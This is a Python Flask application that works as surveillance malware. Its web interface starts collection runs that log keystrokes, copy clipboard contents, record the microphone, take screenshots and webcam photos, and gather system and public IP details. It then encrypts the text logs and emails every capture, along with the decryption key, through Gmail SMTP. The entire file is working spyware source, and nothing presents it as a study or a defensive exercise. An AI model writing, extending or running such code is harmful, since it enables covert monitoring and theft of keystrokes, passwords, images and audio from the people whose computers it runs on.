from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import threading
import os
import time
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import sounddevice as sd
from scipy.io.wavfile import write
from cryptography.fernet import Fernet, InvalidToken
from requests import get
from PIL import ImageGrab
import smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
import cv2

app = Flask(__name__)
CORS(app)

# Global Variables
LOG_DIR = os.path.abspath('logs')
keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
webcam_info = "webcam.png"

keys_info_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"

# Keylogger variables
keys = []
count = 0
stop_event = threading.Event()

# Initialize logs directory
def init_logs_dir():
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
        return True
    except Exception as e:
        print(f"Error creating logs directory: {e}")
        return False

# Get absolute path for log files
def get_log_path(filename):
    return os.path.join(LOG_DIR, filename)

# Functions with proper path handling
def system_information():
    filepath = get_log_path(system_info)
    try:
        with open(filepath, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write(f"Public IP Address: {public_ip}\n")
            except:
                f.write("Couldn't get Public IP Address\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
    except Exception as e:
        print(f"Error writing system info: {e}")

def copy_clipboard():
    filepath = get_log_path(clipboard_info)
    try:
        with open(filepath, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write(f"Clipboard Data:\n{pasted_data}\n")
            except:
                f.write("Clipboard could not be copied.\n")
    except Exception as e:
        print(f"Error writing clipboard info: {e}")

def microphone():
    try:
        fs = 44100
        seconds = 10
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(get_log_path(audio_info), fs, recording)
    except Exception as e:
        print(f"Microphone error: {e}")

def screenshots():
    try:
        im = ImageGrab.grab()
        im.save(get_log_path(screenshot_info))
    except Exception as e:
        print(f"Screenshot error: {e}")

def webcam_capture():
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            raise Exception("Webcam could not be opened.")
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(get_log_path(webcam_info), frame)
        cam.release()
    except Exception as e:
        print(f"Webcam error: {e}")

def keylogger(stop_event):
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        try:
            with open(get_log_path(keys_info), "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if "space" in k:
                        f.write("\n")
                    elif "Key" not in k:
                        f.write(k)
        except Exception as e:
            print(f"Error writing keylog: {e}")

    with Listener(on_press=on_press) as listener:
        while not stop_event.is_set():
            time.sleep(1)
        listener.stop()

def send_email(filename_list, to_addr, from_addr, from_pass, encryption_key_file):
    try:
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = 'Collected Data Files and Encryption Key'

        body = 'Please find attached collected files and the encryption key.'
        msg.attach(MIMEText(body, 'plain'))

        # Attach files
        for file in filename_list:
            try:
                if os.path.exists(file):
                    with open(file, 'rb') as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 
                                      f'attachment; filename={os.path.basename(file)}')
                        msg.attach(part)
            except Exception as e:
                print(f"Could not attach file {file}: {e}")

        # Attach encryption key if it exists
        if os.path.exists(encryption_key_file):
            try:
                with open(encryption_key_file, 'rb') as f:
                    key_attachment = MIMEBase('application', 'octet-stream')
                    key_attachment.set_payload(f.read())
                    encoders.encode_base64(key_attachment)
                    key_attachment.add_header('Content-Disposition',
                                             f'attachment; filename={os.path.basename(encryption_key_file)}')
                    msg.attach(key_attachment)
            except Exception as e:
                print(f"Could not attach encryption key: {e}")

        # Send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_addr, from_pass)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/static/background.mp4')
def serve_static():
    static_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'static')
    return send_from_directory(static_folder, 'background.mp4')

@app.route('/start', methods=['POST'])
def start_collection():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400

        email = data.get('email')
        password = data.get('password')
        interval = int(data.get('interval', 10))
        iterations = int(data.get('iterations', 1))

        if not email or not password:
            return jsonify({"error": "Email and password are required"}), 400

        # Initialize logs directory
        if not init_logs_dir():
            return jsonify({"error": "Could not initialize logs directory"}), 500

        # Generate encryption key
        key = Fernet.generate_key()
        encryption_key_file = get_log_path("encryption_key.txt")
        with open(encryption_key_file, "wb") as f:
            f.write(key)

        # Start data collection
        for _ in range(iterations):
            system_information()
            copy_clipboard()
            microphone()
            screenshots()
            webcam_capture()
            
            stop_event.clear()
            keylogger_thread = threading.Thread(target=keylogger, args=(stop_event,))
            keylogger_thread.start()
            time.sleep(interval)
            stop_event.set()
            keylogger_thread.join()

            # Encrypt text files
            encrypt_files = [
                get_log_path(system_info),
                get_log_path(clipboard_info),
                get_log_path(keys_info),
            ]
            encrypted_files = [
                get_log_path(system_info_e),
                get_log_path(clipboard_info_e),
                get_log_path(keys_info_e),
            ]

            for i in range(len(encrypt_files)):
                try:
                    if os.path.exists(encrypt_files[i]):
                        with open(encrypt_files[i], 'rb') as f:
                            data = f.read()
                        fernet = Fernet(key)
                        encrypted = fernet.encrypt(data)
                        with open(encrypted_files[i], 'wb') as f:
                            f.write(encrypted)
                except Exception as e:
                    print(f"Error encrypting file {encrypt_files[i]}: {e}")

            # Prepare files to send
            files_to_send = []
            for f in encrypted_files + [
                get_log_path(audio_info),
                get_log_path(screenshot_info),
                get_log_path(webcam_info),
            ]:
                if f and os.path.exists(f):
                    files_to_send.append(f)

            # Send email
            send_email(files_to_send, email, email, password, encryption_key_file)

        return jsonify({
            "message": "Data collection and email sending completed",
            "status": "success",
            "files_collected": [os.path.basename(f) for f in files_to_send]
        })
    except Exception as e:
        return jsonify({
            "error": f"Server error: {str(e)}",
            "status": "error"
        }), 500

@app.route('/stop', methods=['POST'])
def stop_collection():
    try:
        stop_event.set()
        return jsonify({
            "message": "Data collection stopped",
            "status": "success"
        })
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": "error"
        }), 500

@app.route('/decrypt', methods=['POST'])
def decrypt_file():
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                "error": "No data provided",
                "status": "error"
            }), 400

        encryption_key = data.get('key')
        file_name = data.get('file_name')

        if not encryption_key or not file_name:
            return jsonify({
                "error": "Both encryption key and file name are required",
                "status": "error"
            }), 400

        allowed_files = ['e_systeminfo.txt', 'e_clipboard.txt', 'e_key_log.txt']
        if file_name not in allowed_files:
            return jsonify({
                "error": "Invalid file name",
                "status": "error"
            }), 400

        encrypted_file_path = get_log_path(file_name)
        if not os.path.exists(encrypted_file_path):
            return jsonify({
                "error": "File not found",
                "status": "error"
            }), 404

        with open(encrypted_file_path, 'rb') as f:
            encrypted_data = f.read()

        try:
            fernet = Fernet(encryption_key.encode())
            decrypted_data = fernet.decrypt(encrypted_data)
        except InvalidToken:
            return jsonify({
                "error": "Invalid encryption key",
                "status": "error"
            }), 400
        except Exception as e:
            return jsonify({
                "error": f"Decryption failed: {str(e)}",
                "status": "error"
            }), 500

        decrypted_file_name = 'd_' + file_name[2:]
        decrypted_file_path = get_log_path(decrypted_file_name)
        with open(decrypted_file_path, 'wb') as f:
            f.write(decrypted_data)

        try:
            decrypted_content = decrypted_data.decode('utf-8')
        except UnicodeDecodeError:
            decrypted_content = "Binary content not displayed"

        return jsonify({
            "message": "File decrypted successfully",
            "status": "success",
            "file_name": decrypted_file_name,
            "content": decrypted_content,
            "download_link": f"/download/{decrypted_file_name}"
        })
    except Exception as e:
        return jsonify({
            "error": f"Server error: {str(e)}",
            "status": "error"
        }), 500

@app.route('/download/<filename>')
def download_decrypted(filename):
    try:
        allowed_files = ['d_systeminfo.txt', 'd_clipboard.txt', 'd_key_log.txt']
        if filename not in allowed_files:
            return jsonify({
                "error": "Invalid file name",
                "status": "error"
            }), 400

        file_path_to_download = get_log_path(filename)
        if not os.path.exists(file_path_to_download):
            return jsonify({
                "error": "File not found",
                "status": "error"
            }), 404

        return send_from_directory(LOG_DIR, filename, as_attachment=True)
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": "error"
        }), 500

if __name__ == '__main__':
    if init_logs_dir():
        app.run(debug=True)
    else:
        print("Failed to initialize logs directory. Exiting.")